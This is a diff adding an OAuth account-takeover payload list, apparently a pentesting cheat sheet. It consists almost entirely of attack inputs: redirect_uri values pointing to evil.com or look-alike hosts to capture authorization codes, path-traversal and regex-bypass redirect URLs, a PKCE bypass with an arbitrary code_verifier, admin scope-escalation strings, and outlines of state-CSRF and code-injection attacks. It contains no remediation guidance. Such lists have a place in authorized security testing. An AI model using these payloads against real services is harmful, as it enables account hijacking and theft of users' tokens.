@@ -1,0 +1,49 @@
+# ============================================================
+# Account Takeover — OAuth Misconfiguration
+# ============================================================
+
+# ---- Open Redirect in redirect_uri ----
+https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com.evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com%23target.com&response_type=code
+
+# ---- redirect_uri Path Traversal ----
+https://target.com/oauth/authorize?redirect_uri=https://target.com/callback/../attacker/page
+https://target.com/oauth/authorize?redirect_uri=https://target.com%2Fcallback%2F..%2Fattacker%2Fpage
+
+# ---- State Parameter Missing / Predictable ----
+# No state = CSRF vulnerability
+# Predictable state = fixation attack
+https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback&response_type=code&state=1234
+
+# ---- Authorization Code Injection ----
+# Leak authorization code via Referer
+# Code reuse after use
+# Code interception via redirect
+
+# ---- Implicit Flow Token Leakage ----
+# fragment (#access_token=...) in redirect_uri — leaks via Referer or page scripts
+
+# ---- PKCE Bypass ----
+# Missing code_challenge validation
+# code_verifier can be anything if server doesn't check
+https://target.com/oauth/token?code=CODE&code_verifier=anything
+
+# ---- Scope Escalation ----
+# Add scope=admin or scope=openid profile email admin
+scope=read
+scope=read%20write%20admin
+scope=openid%20profile%20email%20offline_access%20admin
+
+# ---- token_hint Leak ----
+# POST /oauth/revoke?token_hint=ACCESS_TOKEN — leaks token to log
+
+# ---- Cross-Account Code Reuse ----
+# Obtain authorization code as attacker
+# Inject into victim's OAuth flow
+
+# ---- Redirect URI Regex Bypass ----
+# If regex: ^https://target\.com/
+# Bypass: https://target.com.evil.com/callback
+# https://target.com@evil.com/callback
+# https://target.com%60.evil.com/callback
